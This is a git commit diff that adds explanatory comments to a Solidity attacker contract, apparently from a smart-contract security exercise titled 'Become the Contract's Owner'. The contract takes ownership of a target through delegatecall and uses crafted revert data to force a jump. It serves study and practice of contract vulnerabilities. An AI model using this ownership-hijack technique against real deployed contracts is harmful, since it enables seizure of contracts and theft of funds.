fb94014a47ae3a4bd9c9d74f4e8b9be1634d17a7
Gustavo Goncalves De Araujo <gugoncal@c1r13s6.42lisboa.com>
2022-11-12 19:37:09 +0000

    fix comments

--- Become the Contract’s Owner/SafeOwnerAttacker.sol
+++ Become the Contract’s Owner/SafeOwnerAttacker.sol
@@ -5,16 +5,21 @@ import "./SafeOwner.sol";
 contract SafeOwnerAttacker {
     
     address public owner;
+    // The first 4 bytes must be equal to SET
     bytes4 internal constant _sel = bytes4(keccak256('Set(uint256)'));
 
+    // This function will be used to work with the delegatecall(makes the Attacker act on the SafeOwner storage) that the function SafeOwner(execute()) calls,
+    // this function is responsable to make the owner variable from the SafeOwner contract became the msg.sender.
     function execute(address) public {
         owner = msg.sender;
 
         bytes4 sel = _sel;
         assembly {
-            // Store sel in memory @ 0x0
+            //Store sel in location 0x0
             mstore(0, sel)
+            //Store 1134 to make the Jumpdest
             mstore(0x4, 1134)
+            //Return data must b exactly 0x24(36) bytes long
             revert(0, 0x24)
         }
     }
